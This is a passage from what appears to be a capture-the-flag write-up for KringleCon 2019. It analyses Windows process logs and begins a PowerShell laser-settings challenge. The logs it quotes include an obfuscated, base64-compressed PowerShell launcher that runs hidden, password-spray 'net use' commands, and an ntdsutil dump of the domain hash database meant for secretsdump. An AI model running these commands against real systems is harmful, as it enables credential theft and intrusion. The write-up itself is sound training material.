XSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=&amp;#39;&amp;#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&amp;#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&amp;#39;Hidden&amp;#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;event_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;logon_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3468&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;616&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\System32\\cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;subtype&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;create&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;132110784202880000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-7e14-5d60-0000-0010bffd2500}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{00000000-0000-0000-0000-000000000000}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_domain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Or the password spray attacks:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nt"&gt;&amp;quot;command_line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bbrandyleaves ???Summer2019  &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nt"&gt;&amp;quot;event_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;logon_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;752&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1072&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;subtype&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;create&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;132186397042689984&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de58-5dd3-0000-0010d9b82600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de52-5dd3-0000-0010dea72600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_domain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nt"&gt;&amp;quot;command_line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bevergreen ???Summer2019  &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nt"&gt;&amp;quot;event_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;logon_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;724&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1072&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;subtype&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;create&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;132186397042960000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de58-5dd3-0000-00104dbd2600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de52-5dd3-0000-0010dea72600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_domain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nt"&gt;&amp;quot;command_line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\civypears ???Summer2019  &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nt"&gt;&amp;quot;event_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;logon_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2848&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1072&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\SysWOW64\\net.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;subtype&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;create&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;132186397043230000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de58-5dd3-0000-0010c1c12600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-de52-5dd3-0000-0010dea72600}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_domain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But the last event is the most interesting one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nt"&gt;&amp;quot;command_line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ntdsutil.exe  \&amp;quot;ac i ntds\&amp;quot; ifm \&amp;quot;create full c:\\hive\&amp;quot; q q&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nt"&gt;&amp;quot;event_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;process&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;logon_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;parent_process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\System32\\cmd.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3556&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3440&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ntdsutil.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;process_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\\Windows\\System32\\ntdsutil.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;subtype&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;create&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;132186398470300000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_pid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-dee7-5dd3-0000-0010f0c44f00}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;unique_ppid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{7431d376-dedb-5dd3-0000-001027be4f00}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_domain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NT AUTHORITY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SYSTEM&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;ntdsutil.exe&lt;/code&gt; can be used to create a full back-up of the
&lt;code&gt;ntds.dit&lt;/code&gt; hive on a domain controller. This file can then be parsed with
something like &lt;a class="reference external" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"&gt;secretsdump.py&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I first thought that this was not the correct answer, because, as I understand
it, &lt;code&gt;ntdsutil.exe&lt;/code&gt; does not interact with the &lt;code&gt;lsass.exe&lt;/code&gt; to
extract password hashes: an external tool must be used to extract these hashes.
Then, after analyzing the rest of the log file, I didn't see any other tool
that could be used to extract hashes. So I tried to answer
&lt;code&gt;ntdsutil.exe&lt;/code&gt;, but was given an error message by the KringleCon form.&lt;/p&gt;
&lt;p&gt;It turns out that the correct solution is &lt;code&gt;ntdsutil&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-5"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id11"&gt;Objective 5:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="sparkle-redberry-s-canberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id12"&gt;Sparkle Redberry's Canberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Apparently, the research lab at Elf U is building a laser that can shoot beams
of Christmas cheer. However, someone apparently messed with the parameters, and
now the laser is not producing enough Mega-Jollies per liter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;WARNGING: ctrl + c restricted in this terminal - Do not use endless loops&lt;/span&gt;
&lt;span class="go"&gt;Type exit to exit PowerShell.&lt;/span&gt;
&lt;span class="go"&gt;PowerShell 6.2.3&lt;/span&gt;
&lt;span class="go"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="go"&gt;https://aka.ms/pscore6-docs&lt;/span&gt;
&lt;span class="go"&gt;Type &amp;#39;help&amp;#39; to get help.&lt;/span&gt;
&lt;span class="go"&gt;🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲                                                                                🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Elf University Student Research Terminal - Christmas Cheer Laser Project       🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 ------------------------------------------------------------------------------ 🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 The research department at Elf University is currently working on a top-secret 🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Laser which shoots laser beams of Christmas cheer at a range of hundreds of    🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 miles. The student research team was successfully able to tweak the laser to   🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Unfortunately, someone broke into the research terminal, changed the laser     🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 settings through the Web API and left a note behind at /home/callingcard.txt.  🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Read the calling card and follow the clues to find the correct laser Settings. 🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Apply these correct settings to the laser using it&amp;#39;s Web API to achieve laser  🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 output of 5 Mega-Jollies per liter.                                            🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲                                                                                🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲 Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info.  🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲                                                                                🗲&lt;/span&gt;
&lt;span class="go"&gt;🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's try to find the correct value for the different parameters. Let's start
with the &lt;code&gt;Invoke-WebRequest&lt;/code&gt; command:&lt;/p&gt;
